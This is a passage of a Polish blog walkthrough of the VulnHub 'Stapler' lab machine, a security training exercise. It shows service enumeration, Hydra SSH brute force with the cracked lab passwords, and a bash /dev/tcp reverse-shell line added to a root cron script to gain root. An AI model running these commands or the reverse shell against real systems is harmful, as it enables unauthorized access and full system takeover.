+|   NetBIOS computer name: RED<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+|   Domain name: <span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+|   FQDN: red
+|_  System time: 2022-08-05T14:50:52+01:00
+|_clock-skew: mean: 1h40m00s, deviation: 34m38s, median: 1h59m59s
+|_nbstat: NetBIOS name: RED, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span style="color:#f92672">(</span>unknown<span style="color:#f92672">)</span>
+| smb2-time: 
+|   date: 2022-08-05T13:50:53
+|_  start_date: N/A
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</code></pre></div><p>Widzimy kilka otwartych portów. Zacznę od enumeracji FTP na porcie <code>21</code>.</p>
+<hr>
+<h2 id="ftp">FTP<a hidden class="anchor" aria-hidden="true" href="#ftp">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/vulnhub/stapler<span style="color:#f92672">]</span>
+└╼<span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$ftp 192.168.2.144                                                                                       
+Connected to 192.168.2.144.
+220-
+220-|-----------------------------------------------------------------------------------------|
+220-| Harry, make sure to update the banner when you get a chance to show who has access here |
+220-|-----------------------------------------------------------------------------------------|
+220-
+<span style="color:#ae81ff">220</span> 
+Name <span style="color:#f92672">(</span>192.168.2.144:parrot<span style="color:#f92672">)</span>: anonymous
+<span style="color:#ae81ff">331</span> Please specify the password.
+Password:
+<span style="color:#ae81ff">230</span> Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+<span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
+<span style="color:#ae81ff">150</span> Here comes the directory listing.
+-rw-r--r--    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>             <span style="color:#ae81ff">107</span> Jun <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">2016</span> note
+<span style="color:#ae81ff">226</span> Directory send OK.
+ftp&gt; get note
+local: note remote: note
+<span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
+<span style="color:#ae81ff">150</span> Opening BINARY mode data connection <span style="color:#66d9ef">for</span> note <span style="color:#f92672">(</span><span style="color:#ae81ff">107</span> bytes<span style="color:#f92672">)</span>.
+<span style="color:#ae81ff">226</span> Transfer complete.
+<span style="color:#ae81ff">107</span> bytes received in 0.02 secs <span style="color:#f92672">(</span>6.6488 kB/s<span style="color:#f92672">)</span>
+ftp&gt; ls
+<span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
+<span style="color:#ae81ff">150</span> Here comes the directory listing.
+-rw-r--r--    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>             <span style="color:#ae81ff">107</span> Jun <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">2016</span> note
+<span style="color:#ae81ff">226</span> Directory send OK.
+ftp&gt; exit
+<span style="color:#ae81ff">221</span> Goodbye.
+</code></pre></div><p>Łączenie na FTP jako anonymous powiodło się. Pojawił się nawet baner z nazwą użytkownika <code>harry</code>, co na pewno przyda nam się później. Udało się także pobrać plik <code>note</code>. Jego zawartość to:</p>
+<p><code>Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.</code></p>
+<p>Ok, zatem mamy już 3 potencjalnych użytkowników.</p>
+<p>users.txt</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">harry
+elly
+john
+</code></pre></div><hr>
+<h2 id="port-22---openssh-72p2">Port 22 - OpenSSH 7.2p2<a hidden class="anchor" aria-hidden="true" href="#port-22---openssh-72p2">#</a></h2>
+<p>Mamy możliwość enumeracji userów.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220805143839.png" alt=""  />
+
+Początkowo skrypt <code>40136.py</code> nie działał ze względu na błąd <code>AttributeError: module 'time' has no attribute 'clock'</code>. Po zmianie <code>time.clock()</code> na <code>time.perf_counter()</code>. Skrypt zaczął działać poprawnie.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220805143956.png" alt=""  />
+
+Sam skrypt wykonam potem, gdy przeprowadzę enumerację wszystkich usług i portów.</p>
+<hr>
+<h2 id="port-80---http">Port 80 - HTTP<a hidden class="anchor" aria-hidden="true" href="#port-80---http">#</a></h2>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220805140015.png" alt=""  />
+</p>
+<p>Z NMapa oraz po interfejsie widać, że to <code>PHP</code>. Przeprowadziłem skan <code>FeroxBusterem</code>, ale nie znalazłem nic konkretnego poza kilkoma pliczkami z folderu głównego, któregoś usera. Były to pliki m.in. <code>bash.rc</code>, <code>.bash_logout</code>, <code>.profile</code>.</p>
+<hr>
+<h2 id="port-666---doom">Port 666 - Doom<a hidden class="anchor" aria-hidden="true" href="#port-666---doom">#</a></h2>
+<p>Mamy otwarty nietypowy port. Zazwyczaj z tego portu korzysta gierka <code>Doom</code>. W tym przypadku, gdy użyłem <code>nc</code> do podejrzenia co odpowiada ten port, otrzymałem dziwną odpowiedź.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220805140948.png" alt=""  />
+
+Widać już tutaj, że będzie to plik graficzny <code>message2.jpg</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc 192.168.2.144 <span style="color:#ae81ff">666</span> &gt; file.png
+</code></pre></div><p>Po przekierowaniu tego do <code>file.png</code> próbowałem zobaczyć w edytorze graficznym co to jest, ale plik nie otwierał się poprawnie.</p>
+<p>Okazało się, że pliczek należy rozpakować i właśnie w nim był pliczek <code>message2.jpg</code>.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220805141127.png" alt=""  />
+</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220805141235.png" alt=""  />
+</p>
+<p>Okazało się, że to easter egg, chociaż mamy dodatkowego usera <code>scotta</code>.</p>
+<p>Użyłem również <code>exiftool</code>. Jedna ze zmiennych miała zapisany tekst.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220805181428.png" alt=""  />
+
+Cookie, tylko gdzie&hellip;</p>
+<hr>
+<h2 id="port-3306---mysql-5712">Port 3306 - MySQL 5.7.12<a hidden class="anchor" aria-hidden="true" href="#port-3306---mysql-5712">#</a></h2>
+<p>Gdy tylko mam dokładne wersje oprogramowania, zawsze sprawdzam czy są jakieś exploity w <code>searchsploit</code>. W tym przypadku mamy tylko Integer Overflow, co nam nie pomoże.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220805141431.png" alt=""  />
+</p>
+<hr>
+<h2 id="port-12380---apache-httpd-2418">Port 12380 - Apache httpd 2.4.18<a hidden class="anchor" aria-hidden="true" href="#port-12380---apache-httpd-2418">#</a></h2>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220805142216.png" alt=""  />
+</p>
+<p>W kodzie źródłowym znalazłem ciekawą notkę.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220805142611.png" alt=""  />
+</p>
+<p>Kolejny user - <code>zoe</code>. Natomiast nie ma tutaj nic więcej.</p>
+<hr>
+<h2 id="enum4linux">enum4linux<a hidden class="anchor" aria-hidden="true" href="#enum4linux">#</a></h2>
+<p>Zauważyłem, że zawsze, gdy jest Samba, warto użyć <code>enum4linux</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/vulnhub/stapler<span style="color:#f92672">]</span>                                                                                                                          
+└╼<span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$enum4linux 192.168.2.144
+...
+...
+ <span style="color:#f92672">==========================================</span>                                                                                                          <span style="color:#f92672">[</span>294/813<span style="color:#f92672">]</span>
+|    Share Enumeration on 192.168.2.144    |                                                                                                                  
+ <span style="color:#f92672">==========================================</span>                                                                                                                   
+                                                                                                                                                              
+        Sharename       Type      Comment                                                                                                                     
+        ---------       ----      -------                                                                                                                     
+        print$          Disk      Printer Drivers                                                                                                             
+        kathy           Disk      Fred, What are we doing here?                                                                                               
+        tmp             Disk      All temporary files should be stored here                                                                                   
+        IPC$            IPC       IPC Service <span style="color:#f92672">(</span>red server <span style="color:#f92672">(</span>Samba, Ubuntu<span style="color:#f92672">))</span>                                                                                    
+SMB1 disabled -- no workgroup available                                                                                                                       
+                                                                                                                                                              
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Attempting to map shares on 192.168.2.144                                                                                                                 
+//192.168.2.144/print$  Mapping: DENIED, Listing: N/A                                                                                                         
+//192.168.2.144/kathy   Mapping: OK, Listing: OK                                                                                                              
+//192.168.2.144/tmp     Mapping: OK, Listing: OK                                                                                                              
+//192.168.2.144/IPC$    <span style="color:#f92672">[</span>E<span style="color:#f92672">]</span> Cant understand response:                                                                                                        
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing <span style="color:#ae81ff">\*</span>                                                                                                                    
+                                                                                                                                                              
+ <span style="color:#f92672">=====================================================</span>                                                                                                        
+|    Password Policy Information <span style="color:#66d9ef">for</span> 192.168.2.144    |                                                                                                       
+ <span style="color:#f92672">=====================================================</span>                                                                                                        
+                                                                                                                                                              
+                                                                                                                                                              
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Attaching to 192.168.2.144 using a NULL share                                                                                                             
+                                                                                                                                                              
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Trying protocol 139/SMB...                                                                                                                                
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found domain<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
+
+        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> RED
+        <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Builtin
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerating users using SID S-1-22-1 and logon username <span style="color:#e6db74">&#39;&#39;</span>, password <span style="color:#e6db74">&#39;&#39;</span>                                                                                   
+S-1-22-1-1000 Unix User<span style="color:#ae81ff">\p</span>eter <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                    
+S-1-22-1-1001 Unix User<span style="color:#ae81ff">\R</span>Nunemaker <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                               
+S-1-22-1-1002 Unix User<span style="color:#ae81ff">\E</span>Tollefson <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                               
+S-1-22-1-1003 Unix User<span style="color:#ae81ff">\D</span>Swanger <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                 
+S-1-22-1-1004 Unix User<span style="color:#ae81ff">\A</span>Parnell <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                 
+S-1-22-1-1005 Unix User<span style="color:#ae81ff">\S</span>Hayslett <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                
+S-1-22-1-1006 Unix User<span style="color:#ae81ff">\M</span>Bassin <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                  
+S-1-22-1-1007 Unix User<span style="color:#ae81ff">\J</span>Bare <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                    
+S-1-22-1-1008 Unix User<span style="color:#ae81ff">\L</span>Solum <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                   
+S-1-22-1-1009 Unix User<span style="color:#ae81ff">\I</span>Chadwick <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                
+S-1-22-1-1010 Unix User<span style="color:#ae81ff">\M</span>Frei <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                    
+S-1-22-1-1011 Unix User<span style="color:#ae81ff">\S</span>Stroud <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                  
+S-1-22-1-1012 Unix User<span style="color:#ae81ff">\C</span>Ceaser <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                  
+S-1-22-1-1013 Unix User<span style="color:#ae81ff">\J</span>Kanode <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                  
+S-1-22-1-1014 Unix User<span style="color:#ae81ff">\C</span>Joo <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                     
+S-1-22-1-1015 Unix User<span style="color:#ae81ff">\E</span>eth <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                     
+S-1-22-1-1016 Unix User<span style="color:#ae81ff">\L</span>Solum2 <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                  
+S-1-22-1-1017 Unix User<span style="color:#ae81ff">\J</span>Lipps <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                   
+S-1-22-1-1018 Unix User<span style="color:#ae81ff">\j</span>amie <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                    
+S-1-22-1-1019 Unix User<span style="color:#ae81ff">\S</span>am <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                      
+S-1-22-1-1020 Unix User<span style="color:#ae81ff">\D</span>rew <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                     
+S-1-22-1-1021 Unix User<span style="color:#ae81ff">\j</span>ess <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                     
+S-1-22-1-1022 Unix User<span style="color:#ae81ff">\S</span>HAY <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                     
+S-1-22-1-1023 Unix User<span style="color:#ae81ff">\T</span>aylor <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                   
+S-1-22-1-1024 Unix User<span style="color:#ae81ff">\m</span>el <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                      
+S-1-22-1-1025 Unix User<span style="color:#ae81ff">\k</span>ai <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                      
+S-1-22-1-1026 Unix User<span style="color:#ae81ff">\z</span>oe <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                      
+S-1-22-1-1027 Unix User<span style="color:#ae81ff">\N</span>ATHAN <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                   
+S-1-22-1-1028 Unix User<span style="color:#ae81ff">\w</span>ww <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>                                                                                                                      
+S-1-22-1-1029 Unix User<span style="color:#ae81ff">\e</span>lly <span style="color:#f92672">(</span>Local User<span style="color:#f92672">)</span>
+</code></pre></div><p>Mamy sporo ciekawych informacji. Przede wszystkim jest cała lista użytkowników. Użyję <code>awk</code>, aby utworzyć gotowy plik <code>users.txt</code> ze wszystkimi.</p>
+<p>Najpierw wrzuciłem cały powyższy output do <code>users.txt</code>. Najpierw separatorem była spacja a potem użyłem <code>awk</code> jeszcze raz z separatorem na <code>\</code>. Tak otrzymałem gotową listę</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/vulnhub/stapler<span style="color:#f92672">]</span>                                                                                                                          
+└╼<span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$awk <span style="color:#e6db74">&#39;{print $3}&#39;</span> users.txt | awk -F<span style="color:#e6db74">&#39;\&#39;</span> <span style="color:#e6db74">&#39;{print $2}&#39;</span>                                                                                                    
+peter                                                                                                                                                         
+RNunemaker                                                                                                                                                    
+ETollefson                                                                                                                                                    
+DSwanger                                                                                                                                                      
+AParnell                                                                                                                                                      
+SHayslett                                                                                                                                                     
+MBassin                                                                                                                                                       
+JBare                                                                                                                                                         
+LSolum                                                                                                                                                        
+IChadwick                                                                                                                                                     
+MFrei                                                                                                                                                         
+SStroud                                                                                                                                                       
+CCeaser
+JKanode
+CJoo
+Eeth
+LSolum2
+JLipps
+jamie
+Sam
+Drew
+jess
+SHAY
+Taylor
+mel
+kai
+zoe
+NATHAN
+www
+elly
+</code></pre></div><hr>
+<h2 id="ssh-enum---limited-shell">SSH Enum -&gt; Limited shell<a hidden class="anchor" aria-hidden="true" href="#ssh-enum---limited-shell">#</a></h2>
+<p>Gdy mam już całą listę userów, teraz można przeprowadzić próbę brute-force.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/vulnhub/stapler<span style="color:#f92672">]</span>
+└╼<span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$hydra -L users.txt -P /opt/SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt ssh://192.168.2.144                    
+Hydra v9.1 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
+
+Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2022-08-06 16:06:59
+<span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style="color:#ae81ff">4</span>
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">814</span> login tries <span style="color:#f92672">(</span>l:37/p:22<span style="color:#f92672">)</span>, ~51 tries per task
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking ssh://192.168.2.144:22/
+<span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 192.168.2.144   login: MFrei   password: letmein
+<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 269.00 tries/min, <span style="color:#ae81ff">269</span> tries in 00:01h, <span style="color:#ae81ff">550</span> to <span style="color:#66d9ef">do</span> in 00:03h, <span style="color:#ae81ff">16</span> active
+<span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 192.168.2.144   login: Drew   password: qwerty
+<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 261.00 tries/min, <span style="color:#ae81ff">522</span> tries in 00:02h, <span style="color:#ae81ff">298</span> to <span style="color:#66d9ef">do</span> in 00:02h, <span style="color:#ae81ff">16</span> active
+<span style="color:#f92672">[</span>STATUS<span style="color:#f92672">]</span> 262.00 tries/min, <span style="color:#ae81ff">786</span> tries in 00:03h, <span style="color:#ae81ff">34</span> to <span style="color:#66d9ef">do</span> in 00:01h, <span style="color:#ae81ff">16</span> active
+<span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">2</span> valid passwords found
+<span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Writing restore file because <span style="color:#ae81ff">5</span> final worker threads did not complete <span style="color:#66d9ef">until</span> end.
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> <span style="color:#ae81ff">5</span> targets did not resolve or could not be connected
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> <span style="color:#ae81ff">0</span> target did not complete
+Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2022-08-06 16:10:11
+</code></pre></div><p><code>MFrei:letmein</code>
+<code>Drew:qwerty</code></p>
+<p>Użyłem bardzo małego słownika, ale mimo to mamy efekty. Udało mi się zalogować na usera <code>Drew</code> 😃</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220806190144.png" alt=""  />
+</p>
+<hr>
+<h1 id="privileges-escalation">Privileges Escalation<a hidden class="anchor" aria-hidden="true" href="#privileges-escalation">#</a></h1>
+<p>Mamy dwie ścieżki na roota na pierwszy rzut oka.</p>
+<ol>
+<li>Jądro systemu ma wiele podatności. Część jest wypisana tutaj <a href="https://github.com/kkamagui/linux-kernel-exploits">https://github.com/kkamagui/linux-kernel-exploits</a>.</li>
+</ol>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220806190258.png" alt=""  />
+</p>
+<ol start="2">
+<li>
+<p>Mamy uprawnienie <code>write</code> do skryptu, który jest w cronie.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220806190539.png" alt=""  />
+</p>
+</li>
+</ol>
+<p>Zawartość skryptu:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Drew@red:/etc/cron.d$ cat /usr/local/sbin/cron-logrotate.sh
+<span style="color:#75715e">#Simon, you really need to-do something about this</span>
+</code></pre></div><p>Spróbuję podejść do crona.</p>
+<p>Gdy zerkniemy sobie do <code>/etc/cron.d</code>, zobaczymy między innymi nasz skrypcik <code>logrotate</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Drew@red:/etc/cron.d$ ls -al
+total <span style="color:#ae81ff">32</span>
+drwxr-xr-x   <span style="color:#ae81ff">2</span> root root  <span style="color:#ae81ff">4096</span> Jun  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2016</span> .
+drwxr-xr-x <span style="color:#ae81ff">100</span> root root <span style="color:#ae81ff">12288</span> Aug  <span style="color:#ae81ff">6</span> 21:25 ..
+-rw-r--r--   <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">102</span> Jun  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2016</span> .placeholder
+-rw-r--r--   <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">56</span> Jun  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2016</span> logrotate
+-rw-r--r--   <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">589</span> Jul <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2014</span> mdadm
+-rw-r--r--   <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">670</span> Mar  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2016</span> php
+</code></pre></div><p>Jego zawartość to:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">*/5 *   * * *   root  /usr/local/sbin/cron-logrotate.sh
+</code></pre></div><p>Pomogłem sobie stroną <a href="https://crontab.guru/">https://crontab.guru/</a>, ponieważ nie mam doświadczenia w czytaniu wyrażeń crona.</p>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220806203736.png" alt=""  />
+</p>
+<p>Jak widać, skrypcik wykonuje się co każde 5 minut. Można więc dopisać prosty reverse shell i otrzymamy roota.</p>
+<p>Dopisuję do <code>/usr/local/sbin/cron-logrotate.sh</code> poniższą linię.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/bin/bash -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/&#34;192.168.2.128&#34;/9001 0&gt;&amp;1&#39;</span>
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220806211123.png" alt=""  />
+</p>
+<p>I o równej 21:10 otrzymuję roota 😁</p>
+<p>Stapler miał bardzo dużo tzw. <code>rabbit holes</code>. W naszym przypadku były to porty/usługi, które często sprowadzały na zły trop. Finalnie udało się dostać na roota. Myślę, że jeszcze prościej byłoby wykonać exploita na jądrze systemu, ale dzisiaj poćwiczyłem crontaba 😉</p>
+<hr>
+<h2 id="root-proof">Root proof<a hidden class="anchor" aria-hidden="true" href="#root-proof">#</a></h2>
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020220806211336.png" alt=""  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://suszczyk.github.io/tags/linux/">Linux</a></li>
+      <li><a href="https://suszczyk.github.io/tags/easy/">Easy</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://suszczyk.github.io/posts/hackthebox/logforge/">
+    <span class="title">« Prev Page</span>
+    <br>
+    <span>LogForge - HackTheBox</span>
+  </a>
+  <a class="next" href="https://suszczyk.github.io/posts/vulnhub/mr-robot-1/">
+    <span class="title">Next Page »</span>
+    <br>
+    <span>Mr-Robot 1</span>
+  </a>
+</nav>
+
+
+<div class="share-buttons">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Stapler on twitter"
+        href="https://twitter.com/intent/tweet/?text=Stapler&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fvulnhub%2fstapler%2f&amp;hashtags=Linux%2cEasy">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Stapler on linkedin"
+        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fvulnhub%2fstapler%2f&amp;title=Stapler&amp;summary=Stapler&amp;source=https%3a%2f%2fsuszczyk.github.io%2fposts%2fvulnhub%2fstapler%2f">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share Stapler on reddit"
+        href="https://reddit.com/submit?url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fvulnhub%2fstapler%2f&title=Stapler">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
+            <path
